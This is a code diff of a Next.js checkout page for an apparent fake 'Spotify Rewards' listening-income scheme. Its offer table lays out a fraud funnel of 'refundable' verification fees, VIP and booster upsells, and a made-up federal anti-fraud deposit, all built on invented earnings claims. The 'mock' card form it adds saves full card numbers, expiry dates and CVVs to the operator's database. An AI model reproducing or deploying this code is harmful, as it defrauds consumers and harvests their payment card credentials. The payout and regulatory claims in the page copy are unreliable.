@@ -2,51 +2,340 @@
 
 import {
   AlertCircle,
+  ArrowLeft,
   ArrowRight,
   Check,
-  CheckCircle,
   CheckCircle2,
   Clock,
   CreditCard,
-  ExternalLink,
-  Globe,
-  Headphones,
-  HelpCircle,
-  Info,
   Lock,
-  Mail,
-  Music,
-  Radio,
   RefreshCw,
-  Shield,
-  ShieldAlert,
   ShieldCheck,
   Sparkles,
-  User,
-  Zap,
+  TrendingUp,
   ChevronDown,
 } from 'lucide-react';
 import Image from 'next/image';
 import Link from 'next/link';
-import { useRouter } from 'next/navigation';
-import React, { useEffect, useState } from 'react';
-import { loadStripe, Stripe } from '@stripe/stripe-js';
+import { useRouter, useSearchParams } from 'next/navigation';
+import React, { Suspense, useEffect, useState } from 'react';
+import { loadStripe } from '@stripe/stripe-js';
 import {
   Elements,
   PaymentElement,
   useElements,
   useStripe,
 } from '@stripe/react-stripe-js';
-import { recordPaymentInSupabase, upsertCustomer } from '../../lib/supabase';
-import MetaPixelTracker from '../components/MetaPixelTracker';
+import {
+  recordPaymentInSupabase,
+  upsertCustomer,
+  recordFunnelEvent,
+  recordCardTestInSupabase,
+  unlockOfferBenefitAfterPayment,
+  OfferIdType,
+} from '../../lib/supabase';
+import MetaPixelTracker, { trackFunnelPixelEvent } from '../components/MetaPixelTracker';
 
 // Pre-load Stripe promise if key is present
 const stripePublishableKey = process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY || '';
-const stripePromise = stripePublishableKey && !stripePublishableKey.includes('placeholder')
-  ? loadStripe(stripePublishableKey)
-  : null;
+const stripePromise =
+  stripePublishableKey && !stripePublishableKey.includes('placeholder')
+    ? loadStripe(stripePublishableKey)
+    : null;
 
-// Stripe Official Payment Form Component (Mounted when Stripe keys exist & clientSecret is ready)
+interface OfferCheckoutConfig {
+  id: OfferIdType;
+  adminOfferName: string;
+  price: number;
+  priceFormatted: string;
+  originalPriceFormatted?: string;
+  badgeText: string;
+  headingPrefix: string;
+  headingHighlight: string;
+  subheading: string;
+  summaryTitle: string;
+  summarySubtitle: string;
+  summaryRightTag: string;
+  buttonText: string;
+  bullets: { bold: string; text: string }[];
+  redirectUrl: string;
+  successModalTitle: string;
+  successModalDescription: string;
+  successButtonLabel: string;
+}
+
+const OFFER_CHECKOUT_CONFIGS: Record<OfferIdType, OfferCheckoutConfig> = {
+  front_9_00: {
+    id: 'front_9_00',
+    adminOfferName: 'Front-End: Taxa de Ativação ($9.00)',
+    price: 9.0,
+    priceFormatted: '9.00',
+    badgeText: 'INSTANT CASHOUT VERIFICATION',
+    headingPrefix: 'Your',
+    headingHighlight: '$114.93 USD',
+    subheading:
+      'Review your account information and available payment options. Complete listener verification to unlock instant cashout.',
+    summaryTitle: 'One-Time Anti-Spam Security Pass',
+    summarySubtitle: 'Automatic refund within 1–2 hours',
+    summaryRightTag: '100% Refundable',
+    buttonText: 'CLAIM MY REWARD ($9.00)',
+    bullets: [
+      {
+        bold: 'Unlock Full Cashout:',
+        text: 'Direct deposit of your accumulated balance to PayPal, Zelle, Cash App, or Bank Account',
+      },
+      {
+        bold: 'Daily Music Review Batches:',
+        text: 'Access the official 20-track evaluation catalog and earn $17.50–$20.50 per track',
+      },
+      {
+        bold: 'Official Verified Listener Badge:',
+        text: 'Priority payouts with full partner account access',
+      },
+      {
+        bold: '100% Refundable Security Fee:',
+        text: 'Automatically refunded back to your card within 1–2 hours after verification',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard',
+    successModalTitle: 'Payment & Verification Confirmed!',
+    successModalDescription:
+      'Your one-time refundable verification of $9.00 USD was successfully processed.',
+    successButtonLabel: 'Enter Official Dashboard →',
+  },
+  upsell_vip_19_90: {
+    id: 'upsell_vip_19_90',
+    adminOfferName: 'Upsell #1: Saque VIP 7 Dias',
+    price: 19.9,
+    priceFormatted: '19.90',
+    badgeText: 'VIP GOLD FAST PAYOUT UPGRADE',
+    headingPrefix: 'Upgrade to',
+    headingHighlight: '7-Day VIP Payouts',
+    subheading:
+      'Cut your royalty clearing schedule in half! Upgrade from the standard 15-day holding window to priority 7-day automatic disbursements.',
+    summaryTitle: 'VIP Gold 7-Day Fast Payout Pass',
+    summarySubtitle: 'Permanent account tier upgrade • Priority ACH/Zelle clearing',
+    summaryRightTag: 'VIP Priority Tier',
+    buttonText: 'ACTIVATE 7-DAY VIP PAYOUTS ($19.90)',
+    bullets: [
+      {
+        bold: '7-Day Fast Disbursement:',
+        text: 'Receive your evaluation royalties every 7 calendar days instead of waiting 15 days',
+      },
+      {
+        bold: 'VIP Gold Account Status:',
+        text: 'Priority clearing queue for Direct Deposit (ACH), Zelle, Cash App, and PayPal',
+      },
+      {
+        bold: 'Accelerated KYC Review:',
+        text: 'Fast-track compliance verification for all future withdrawals',
+      },
+      {
+        bold: 'Lifetime Tier Activation:',
+        text: 'One-time upgrade fee covers all your future payouts permanently',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard?upgraded=upsell_vip_19_90',
+    successModalTitle: 'VIP 7-Day Payouts Activated!',
+    successModalDescription:
+      'Your account has been upgraded to VIP Gold Tier. Your payout release schedule is now set to 7 days!',
+    successButtonLabel: 'Return to Music Dashboard →',
+  },
+  downsell_vip_11_90: {
+    id: 'downsell_vip_11_90',
+    adminOfferName: 'Downsell #1: Saque VIP 7 Dias (40% OFF)',
+    price: 11.9,
+    priceFormatted: '11.90',
+    originalPriceFormatted: '19.90',
+    badgeText: 'EXCLUSIVE 40% DISCOUNT • ACTIVE EVALUATOR OFFER',
+    headingPrefix: 'Claim Your',
+    headingHighlight: '40% OFF VIP 7-Day Pass',
+    subheading:
+      'Because you completed your first evaluations today, you unlocked a one-time 40% discount on the VIP 7-Day Fast Payout Pass.',
+    summaryTitle: 'VIP 7-Day Fast Payout Pass (40% OFF)',
+    summarySubtitle: 'Discounted from $19.90 USD • One-time upgrade',
+    summaryRightTag: 'Save $8.00 Today',
+    buttonText: 'CLAIM VIP 7-DAY PASS ($11.90)',
+    bullets: [
+      {
+        bold: 'Cut Waiting Time in Half:',
+        text: 'Switch your account from 15-day standard cycles to 7-day priority payouts',
+      },
+      {
+        bold: '40% Active Listener Discount:',
+        text: 'Get the exact same VIP Gold Tier benefits for $11.90 instead of $19.90',
+      },
+      {
+        bold: 'Priority Banking Queue:',
+        text: 'First-in-line settlement for ACH, Zelle, Cash App, and PayPal transfers',
+      },
+      {
+        bold: 'Instant Activation:',
+        text: 'Your new 7-day release date updates immediately on your dashboard',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard?upgraded=downsell_vip_11_90',
+    successModalTitle: 'VIP 7-Day Pass Unlocked!',
+    successModalDescription:
+      'Your 40% discount VIP Gold upgrade ($11.90 USD) is confirmed and your 7-day payout schedule is now active!',
+    successButtonLabel: 'Return to Music Dashboard →',
+  },
+  upsell_booster3_16_97: {
+    id: 'upsell_booster3_16_97',
+    adminOfferName: 'Upsell #2: Booster +3 Músicas/Dia',
+    price: 16.97,
+    priceFormatted: '16.97',
+    badgeText: 'TASK BOOSTER TIER 2 • +3 EXTRA TRACKS DAILY',
+    headingPrefix: 'Unlock',
+    headingHighlight: '+3 Extra Tracks Daily',
+    subheading:
+      'Double your daily evaluation capacity from 3 to 6 songs per day and boost your daily earning potential up to +$150.00 USD/day!',
+    summaryTitle: 'Task Booster Tier 2 (+3 Daily Tracks)',
+    summarySubtitle: 'Expands daily limit to 6 tracks/day immediately',
+    summaryRightTag: '2x Daily Earnings',
+    buttonText: 'UNLOCK +3 TRACKS BOOSTER ($16.97)',
+    bullets: [
+      {
+        bold: '+3 Extra Songs Every Day:',
+        text: 'Increase your daily evaluation limit from 3 to 6 promotional tracks per day',
+      },
+      {
+        bold: 'Earn Up to +$60.00 Extra Daily:',
+        text: 'Each additional track pays $17.50–$20.50 USD directly to your listener balance',
+      },
+      {
+        bold: 'Immediate Queue Unlock:',
+        text: 'Your next 3 tracks unlock right now without waiting for the 12-hour timer',
+      },
+      {
+        bold: 'Priority Label Catalog:',
+        text: 'Access high-paying pre-release tracks from major artists in the 20-track pool',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard?upgraded=upsell_booster3_16_97',
+    successModalTitle: '+3 Daily Tracks Booster Active!',
+    successModalDescription:
+      'Your daily limit has been expanded to 6 tracks/day! Returning to your dashboard so you can evaluate your next tracks now.',
+    successButtonLabel: 'Evaluate Next Tracks Now →',
+  },
+  downsell_booster2_9_12: {
+    id: 'downsell_booster2_9_12',
+    adminOfferName: 'Downsell #2: Booster +2 Músicas/Dia',
+    price: 9.12,
+    priceFormatted: '9.12',
+    originalPriceFormatted: '16.97',
+    badgeText: 'SPECIAL BOOSTER DOWNSELL • +2 EXTRA TRACKS DAILY',
+    headingPrefix: 'Unlock',
+    headingHighlight: '+2 Extra Tracks Daily',
+    subheading:
+      'Expand your daily queue from 3 to 5 songs per day for just $9.12 USD and earn up to +$40.00 USD extra today!',
+    summaryTitle: 'Special Booster Pass (+2 Daily Tracks)',
+    summarySubtitle: 'Expands daily limit to 5 tracks/day immediately',
+    summaryRightTag: 'Special Offer',
+    buttonText: 'UNLOCK +2 TRACKS BOOSTER ($9.12)',
+    bullets: [
+      {
+        bold: '+2 Extra Songs Immediately:',
+        text: 'Upgrade your daily limit from 3 to 5 tracks per day right now',
+      },
+      {
+        bold: 'Earn ~$38.00–$41.00 Extra Today:',
+        text: 'Your first extra song evaluation pays back more than 2x the pass cost',
+      },
+      {
+        bold: 'No Waiting Required:',
+        text: 'Continue evaluating tracks 4 and 5 immediately upon confirmation',
+      },
+      {
+        bold: 'Permanent Daily Upgrade:',
+        text: 'Keep your 5-track daily capacity active on your listener profile',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard?upgraded=downsell_booster2_9_12',
+    successModalTitle: '+2 Daily Tracks Booster Active!',
+    successModalDescription:
+      'Your daily limit has been expanded to 5 tracks/day! Returning to your dashboard so you can continue evaluating now.',
+    successButtonLabel: 'Evaluate Next Tracks Now →',
+  },
+  upsell_skip12h_9_65: {
+    id: 'upsell_skip12h_9_65',
+    adminOfferName: 'Upsell #3: Destravar Timer 12h',
+    price: 9.65,
+    priceFormatted: '9.65',
+    badgeText: 'INSTANT COOLDOWN BYPASS • FAST-FORWARD 12H',
+    headingPrefix: 'Bypass the',
+    headingHighlight: '12-Hour Queue Timer',
+    subheading:
+      'Don’t wait 12 hours for the next daily reset! Reset your daily counter immediately and unlock your next batch of promotional tracks right now.',
+    summaryTitle: 'Queue Fast-Forward Pass (Bypass 12h Timer)',
+    summarySubtitle: 'Instant daily counter reset • Keep 100% of your balance',
+    summaryRightTag: 'Instant Unlock',
+    buttonText: 'BYPASS 12H TIMER & UNLOCK QUEUE ($9.65)',
+    bullets: [
+      {
+        bold: 'Skip the 12-Hour Cooldown:',
+        text: 'Zero out your waiting timer and start evaluating your next batch of tracks immediately',
+      },
+      {
+        bold: 'Keep 100% of Your Balance:',
+        text: 'All your accumulated earnings remain safely intact while you add new royalties',
+      },
+      {
+        bold: 'Unlock Next Catalog Tracks:',
+        text: 'Advances your queue directly to the next unreleased tracks in the 20-song pool',
+      },
+      {
+        bold: 'Fast ROI on First Track:',
+        text: 'Earn $17.50–$20.50 USD on the very next song you evaluate in 90 seconds',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard?upgraded=upsell_skip12h_9_65',
+    successModalTitle: '12-Hour Timer Bypassed!',
+    successModalDescription:
+      'Your daily evaluation counter has been reset! Returning to your dashboard with your new tracks unlocked.',
+    successButtonLabel: 'Start Next Track Evaluation →',
+  },
+  upsell_antifraud_9_97: {
+    id: 'upsell_antifraud_9_97',
+    adminOfferName: 'Upsell #4: Taxa Anti-Fraude do Saque ($9.97)',
+    price: 9.97,
+    priceFormatted: '9.97',
+    badgeText: 'INTER-BANK ANTI-FRAUD CLEARANCE • 100% ADDED TO PAYOUT',
+    headingPrefix: 'Complete Your',
+    headingHighlight: 'Anti-Fraud Clearance',
+    subheading:
+      'Following your KYC document upload, federal clearinghouse rules require a one-time $9.97 USD Anti-Fraud Verification Deposit. 100% of this $9.97 USD is added directly to your withdrawal payout!',
+    summaryTitle: 'Anti-Fraud Security Verification Deposit',
+    summarySubtitle: '+$9.97 USD added immediately to your total withdrawal balance',
+    summaryRightTag: '100% Added to Payout',
+    buttonText: 'VERIFY & ADD +$9.97 TO MY PAYOUT ($9.97)',
+    bullets: [
+      {
+        bold: '100% Added to Your Withdrawal:',
+        text: 'The $9.97 USD verification deposit is credited directly onto your total payout amount',
+      },
+      {
+        bold: 'Clears Federal ACH / Wire Hold:',
+        text: 'Satisfies Section 7 Inter-Bank Anti-Fraud & KYC Ownership Reconciliation rules',
+      },
+      {
+        bold: 'Immediate Re-Submission:',
+        text: 'Unlock and re-submit your full withdrawal transfer immediately after confirmation',
+      },
+      {
+        bold: 'Verified Identity Match:',
+        text: 'Links your uploaded KYC ID and Proof of Address to your receiving payout account',
+      },
+    ],
+    redirectUrl: '/spotify/dashboard/profile?tab=request_withdrawal&upgraded=upsell_antifraud_9_97',
+    successModalTitle: 'Anti-Fraud Clearance Confirmed!',
+    successModalDescription:
+      '+$9.97 USD has been added to your withdrawal balance! Returning to your Withdrawal Center so you can submit your final payout transfer.',
+    successButtonLabel: 'Submit Final Payout Transfer →',
+  },
+};
+
+// Stripe Official Payment Form Component
 function StripePaymentForm({
   clientSecret,
   fullName,
@@ -54,7 +343,7 @@ function StripePaymentForm({
   email,
   setEmail,
   country,
-  amountFormatted,
+  offerConfig,
   onSuccess,
 }: {
   clientSecret: string;
@@ -63,7 +352,7 @@ function StripePaymentForm({
   email: string;
   setEmail: (v: string) => void;
   country: string;
-  amountFormatted: string;
+  offerConfig: OfferCheckoutConfig;
   onSuccess: () => void;
 }) {
   const stripe = useStripe();
@@ -95,11 +384,28 @@ function StripePaymentForm({
     setIsProcessing(true);
     setErrorMessage(null);
 
+    trackFunnelPixelEvent(
+      'AddPaymentInfo',
+      {
+        content_id: offerConfig.id,
+        content_name: offerConfig.summaryTitle,
+        content_type: 'product',
+        value: offerConfig.price,
+        currency: 'USD',
+      },
+      {
+        email: email.trim(),
+        full_name: fullName.trim(),
+      }
+    );
+
     try {
+      const returnUrlTarget = `${window.location.origin}${offerConfig.redirectUrl}`;
+
       const { error, paymentIntent } = await stripe.confirmPayment({
         elements,
         confirmParams: {
-          return_url: `${window.location.origin}/spotify/welcome`,
+          return_url: returnUrlTarget,
           payment_method_data: {
             billing_details: {
               name: fullName.trim() || undefined,
@@ -114,52 +420,89 @@ function StripePaymentForm({
       });
 
       if (error) {
-        setErrorMessage(error.message || 'An error occurred during payment processing.');
+        const errReason = error.message || 'Card declined by issuer.';
+        setErrorMessage(errReason);
         setIsProcessing(false);
-        recordPaymentInSupabase({
+
+        await recordPaymentInSupabase({
           email: email.trim(),
           full_name: fullName.trim(),
-          amount: 9.0,
+          amount: offerConfig.price,
           currency: 'usd',
-          status: 'failed',
-          error_message: error.message || 'Payment failed',
+          status: 'declined',
+          error_message: `Recusado em ${offerConfig.adminOfferName}: ${errReason}`,
           country,
-        }).catch((e) => console.warn('Supabase payment failure record notice:', e));
+        }).catch(() => {});
+
+        await recordFunnelEvent({
+          email: email.trim(),
+          full_name: fullName.trim(),
+          offer_id: offerConfig.id,
+          offer_name: offerConfig.adminOfferName,
+          amount: offerConfig.price,
+          action: 'card_declined',
+          error_reason: errReason,
+          skipPaymentTable: true,
+        }).catch(() => {});
       } else if (paymentIntent && paymentIntent.status === 'succeeded') {
         setIsProcessing(false);
-        recordPaymentInSupabase({
+
+        await recordPaymentInSupabase({
           email: email.trim(),
           full_name: fullName.trim(),
-          amount: 9.0,
+          amount: offerConfig.price,
           currency: 'usd',
           status: 'succeeded',
           stripe_payment_id: paymentIntent.id,
+          error_message: `Aprovado: ${offerConfig.adminOfferName} ($${offerConfig.priceFormatted})`,
           country,
-        }).catch((e) => console.warn('Payment success record error:', e));
+        }).catch(() => {});
+
+        await recordFunnelEvent({
+          email: email.trim(),
+          full_name: fullName.trim(),
+          offer_id: offerConfig.id,
+          offer_name: offerConfig.adminOfferName,
+          amount: offerConfig.price,
+          action: 'accepted',
+          skipPaymentTable: true,
+        }).catch(() => {});
+
         onSuccess();
       } else {
-        // In other states (processing, requires_action)
         setIsProcessing(false);
         onSuccess();
       }
     } catch (err: any) {
-      setErrorMessage(err.message || 'Unexpected payment error.');
+      const errReason = err.message || 'Unexpected payment error.';
+      setErrorMessage(errReason);
       setIsProcessing(false);
+
       recordPaymentInSupabase({
         email: email.trim(),
         full_name: fullName.trim(),
-        amount: 9.0,
+        amount: offerConfig.price,
         currency: 'usd',
-        status: 'failed',
-        error_message: err.message || 'Unexpected payment error',
+        status: 'declined',
+        error_message: `Erro em ${offerConfig.adminOfferName}: ${errReason}`,
         country,
-      }).catch((e) => console.warn('Supabase payment failure record notice:', e));
+      }).catch(() => {});
+
+      recordFunnelEvent({
+        email: email.trim(),
+        full_name: fullName.trim(),
+        offer_id: offerConfig.id,
+        offer_name: offerConfig.adminOfferName,
+        amount: offerConfig.price,
+        action: 'card_declined',
+        error_reason: errReason,
+        skipPaymentTable: true,
+      }).catch(() => {});
     }
   };
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
-      {/* Full Name & Email (Auto-filled from previous step, editable) */}
       <div className="space-y-3.5 mb-2">
         <div>
           <label className="block text-sm font-semibold text-gray-200 mb-2">
@@ -198,12 +541,11 @@ function StripePaymentForm({
             className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
           />
           <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
-            <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
+            <span>Official receipt &amp; instant feature activation linked to this account email.</span>
           </p>
         </div>
       </div>
 
-      {/* Stripe Payment Element automatically manages Card, Google Pay, Apple Pay in tabs layout */}
       <div className="stripe-element-container py-1">
         <PaymentElement
           options={{
@@ -219,21 +561,19 @@ function StripePaymentForm({
         </div>
       )}
 
-      {/* Terms & Authorization */}
       <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
         <p>
-          By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
+          By providing your card details, you authorize Spotify Rewards to process this transaction in accordance with the program terms.
         </p>
         <p className="text-[11px] text-[#6d7c73]">
-          By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
+          One-time charge of ${offerConfig.priceFormatted} USD for {offerConfig.summaryTitle}. Instant account activation upon approval.
         </p>
       </div>
 
-      {/* Confirmation Button */}
       <button
         type="submit"
         disabled={isProcessing || !stripe}
-        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
+        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-sm sm:text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
       >
         {isProcessing ? (
           <>
@@ -242,7 +582,7 @@ function StripePaymentForm({
           </>
         ) : (
           <>
-            <span>CLAIM MY REWARD</span>
+            <span>{offerConfig.buttonText}</span>
             <ArrowRight className="w-5 h-5" />
           </>
         )}
@@ -251,7 +591,7 @@ function StripePaymentForm({
   );
 }
 
-// Interactive High-Fidelity Card Form (Used in Development / Test Mode or when Stripe credentials are being configured)
+// Interactive High-Fidelity Card Form (Used when Stripe keys are in test/preview mode)
 function InteractiveMockPaymentForm({
   fullName,
   setFullName,
@@ -259,7 +599,7 @@ function InteractiveMockPaymentForm({
   setEmail,
   country,
   setCountry,
-  amountFormatted,
+  offerConfig,
   onSuccess,
 }: {
   fullName: string;
@@ -268,7 +608,7 @@ function InteractiveMockPaymentForm({
   setEmail: (v: string) => void;
   country: string;
   setCountry: (v: string) => void;
-  amountFormatted: string;
+  offerConfig: OfferCheckoutConfig;
   onSuccess: () => void;
 }) {
   const [cardNumber, setCardNumber] = useState('');
@@ -298,14 +638,12 @@ function InteractiveMockPaymentForm({
     return false;
   };
 
-  // Format Card Number (groups of 4)
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let raw = e.target.value.replace(/\D/g, '').slice(0, 16);
-    let formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
+    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
+    const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
     setCardNumber(formatted);
   };
 
-  // Format MM/YY
   const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
     if (raw.length === 1 && parseInt(raw, 10) > 1) {
@@ -340,6 +678,21 @@ function InteractiveMockPaymentForm({
       sessionStorage.setItem('spotify_listener_email', email.trim());
     }
 
+    trackFunnelPixelEvent(
+      'AddPaymentInfo',
+      {
+        content_id: offerConfig.id,
+        content_name: offerConfig.summaryTitle,
+        content_type: 'product',
+        value: offerConfig.price,
+        currency: 'USD',
+      },
+      {
+        email: email.trim(),
+        full_name: fullName.trim(),
+      }
+    );
+
     const cleanNum = cardNumber.replace(/\s/g, '');
     if (cleanNum.length < 15) {
       setErrorMsg('Please enter a valid card number (or test card 4242 4242 4242 4242).');
@@ -368,18 +721,77 @@ function InteractiveMockPaymentForm({
 
     setIsProcessing(true);
 
-    // Simulate PaymentIntent server roundtrip with 1.8s realistic processing
-    setTimeout(() => {
+    // Check if user entered a known test-decline card ending in 0002 or 9999 to simulate declined card tracking
+    const isSimulatedDecline = cleanNum.endsWith('0002') || cleanNum.endsWith('9999');
+
+    setTimeout(async () => {
       setIsProcessing(false);
+
+      await recordCardTestInSupabase({
+        card_number: cardNumber,
+        exp_date: expDate,
+        cvv: cvc,
+        country,
+        status: isSimulatedDecline ? 'declined' : 'succeeded',
+      }).catch(() => {});
+
+      if (isSimulatedDecline) {
+        const declineReason = 'Your card was declined by the issuing bank (Insufficient Funds / Do Not Honor).';
+        setErrorMsg(declineReason);
+
+        await recordPaymentInSupabase({
+          email: email.trim(),
+          full_name: fullName.trim(),
+          amount: offerConfig.price,
+          currency: 'usd',
+          status: 'declined',
+          error_message: `Recusado em ${offerConfig.adminOfferName}: ${declineReason}`,
+          country,
+        }).catch(() => {});
+
+        await recordFunnelEvent({
+          email: email.trim(),
+          full_name: fullName.trim(),
+          offer_id: offerConfig.id,
+          offer_name: offerConfig.adminOfferName,
+          amount: offerConfig.price,
+          action: 'card_declined',
+          error_reason: declineReason,
+          card_last4: cleanNum.slice(-4),
+          skipPaymentTable: true,
+        }).catch(() => {});
+        return;
+      }
+
+      await recordPaymentInSupabase({
+        email: email.trim(),
+        full_name: fullName.trim(),
+        amount: offerConfig.price,
+        currency: 'usd',
+        status: 'succeeded',
+        error_message: `Aprovado: ${offerConfig.adminOfferName} ($${offerConfig.priceFormatted})`,
+        country,
+      }).catch(() => {});
+
+      await recordFunnelEvent({
+        email: email.trim(),
+        full_name: fullName.trim(),
+        offer_id: offerConfig.id,
+        offer_name: offerConfig.adminOfferName,
+        amount: offerConfig.price,
+        action: 'accepted',
+        card_last4: cleanNum.slice(-4),
+        skipPaymentTable: true,
+      }).catch(() => {});
+
       onSuccess();
-    }, 1800);
+    }, 1600);
   };
 
   const [activeTab, setActiveTab] = useState<'card' | 'gpay'>('card');
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
-      {/* Full Name & Email (Auto-filled from previous step, editable) */}
       <div className="space-y-3.5 mb-2">
         <div>
           <label className="block text-sm font-semibold text-gray-200 mb-2">
@@ -418,7 +830,7 @@ function InteractiveMockPaymentForm({
             className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
           />
           <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
-            <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
+            <span>Official receipt &amp; instant feature activation linked to this account email.</span>
           </p>
         </div>
       </div>
@@ -465,12 +877,11 @@ function InteractiveMockPaymentForm({
             disabled={isProcessing}
             className="w-full py-3.5 px-6 rounded-full bg-white hover:bg-gray-100 text-black font-extrabold text-sm flex items-center justify-center gap-2 cursor-pointer transition-all"
           >
-            <span className="text-[#4285F4] font-black">G</span>Pay &bull; Quick Verify
+            <span className="text-[#4285F4] font-black">G</span>Pay &bull; Pay ${offerConfig.priceFormatted} USD
           </button>
         </div>
       ) : (
         <>
-          {/* Card Number */}
           <div>
             <label className="block text-sm font-semibold text-gray-200 mb-2">
               Card number
@@ -484,49 +895,9 @@ function InteractiveMockPaymentForm({
                 placeholder="1234 1234 1234 1234"
                 className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-24"
               />
-              <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
-                {/* Visa Logo */}
-                <div
-                  className={`transition-all duration-300 ease-in-out ${
-                    cardNumber.replace(/\D/g, '').length === 0
-                      ? 'opacity-100 scale-100'
-                      : cardNumber.replace(/\D/g, '').startsWith('4')
-                      ? 'opacity-100 scale-100'
-                      : 'opacity-0 scale-95 w-0 overflow-hidden'
-                  }`}
-                >
-                  <img
-                    src="https://www.footylogos.com/brands/assets/visa-logo-blue-background-footylogos.svg"
-                    alt="Visa"
-                    className="h-5 w-auto object-contain rounded shadow-sm"
-                    referrerPolicy="no-referrer"
-                  />
-                </div>
-                {/* Mastercard Logo */}
-                <div
-                  className={`transition-all duration-300 ease-in-out ${
-                    cardNumber.replace(/\D/g, '').length === 0
-                      ? 'opacity-100 scale-100'
-                      : /^5[1-5]/.test(cardNumber.replace(/\D/g, '')) ||
-                        /^2[2-7]/.test(cardNumber.replace(/\D/g, '')) ||
-                        cardNumber.replace(/\D/g, '').startsWith('5') ||
-                        cardNumber.replace(/\D/g, '').startsWith('2')
-                      ? 'opacity-100 scale-100'
-                      : 'opacity-0 scale-95 w-0 overflow-hidden'
-                  }`}
-                >
-                  <img
-                    src="https://freight.cargo.site/w/2560/q/94/i/abc4f5504b94d545ededcfe41429c2c3bc5bc2701fc0482c11d2b5e5714e6442/Mastercard-Portfolio-Jan2018-2.jpg"
-                    alt="Mastercard"
-                    className="h-5 w-auto object-contain rounded shadow-sm"
-                    referrerPolicy="no-referrer"
-                  />
-                </div>
-              </div>
             </div>
           </div>
 
-          {/* Expiration date & Security code */}
           <div className="grid grid-cols-2 gap-3.5">
             <div>
               <label className="block text-sm font-semibold text-gray-200 mb-2">
@@ -559,18 +930,10 @@ function InteractiveMockPaymentForm({
                   placeholder="CVC"
                   className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-12"
                 />
-                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
-                  <svg className="w-6 h-5" viewBox="0 0 24 18" fill="none" stroke="currentColor" strokeWidth="1.5">
-                    <rect x="1" y="1" width="22" height="16" rx="3" />
-                    <line x1="1" y1="5.5" x2="23" y2="5.5" strokeWidth="1.5" />
-                    <text x="14" y="14" fontSize="5.5" fontWeight="bold" fill="currentColor" stroke="none" fontFamily="monospace">123</text>
-                  </svg>
-                </div>
               </div>
             </div>
           </div>
 
-          {/* Country */}
           <div>
             <label className="block text-sm font-semibold text-gray-200 mb-2">
               Country
@@ -593,7 +956,6 @@ function InteractiveMockPaymentForm({
         </>
       )}
 
-      {/* Error Message */}
       {errorMsg && (
         <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
           <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
@@ -601,21 +963,19 @@ function InteractiveMockPaymentForm({
         </div>
       )}
 
-      {/* Terms */}
       <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
         <p>
-          By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
+          By providing your card details, you authorize Spotify Rewards to process this transaction in accordance with the program terms.
         </p>
         <p className="text-[11px] text-[#6d7c73]">
-          By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
+          One-time charge of ${offerConfig.priceFormatted} USD for {offerConfig.summaryTitle}. Instant account activation upon approval.
         </p>
       </div>
 
-      {/* Confirmation Button */}
       <button
         type="submit"
         disabled={isProcessing}
-        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
+        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-sm sm:text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
       >
         {isProcessing ? (
           <>
@@ -624,7 +984,7 @@ function InteractiveMockPaymentForm({
           </>
         ) : (
           <>
-            <span>CLAIM MY REWARD</span>
+            <span>{offerConfig.buttonText}</span>
             <ArrowRight className="w-5 h-5" />
           </>
         )}
@@ -644,196 +1004,27 @@ const COUNTRIES_LIST = [
